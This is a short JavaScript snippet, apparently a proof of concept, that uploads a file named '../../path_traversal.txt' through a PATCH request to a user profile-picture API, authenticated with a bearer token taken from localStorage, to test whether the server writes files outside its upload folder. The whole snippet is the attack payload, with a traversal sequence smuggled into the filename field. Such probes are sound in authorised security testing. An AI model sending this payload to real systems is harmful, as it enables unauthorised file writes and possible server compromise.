{
  const content = "Path Traversal Successful!";
  const blob = new Blob([content], { type: 'text/plain' });

  const text = new FormData();
  text.append('file', blob, '../../path_traversal.txt'); 

  fetch(`/api/users/${current_user_id}/picture`, {
      method: 'PATCH',
      body: text,
      headers: {
          'Authorization': `Bearer ${localStorage.getItem('access_token')}`
      }
  })
}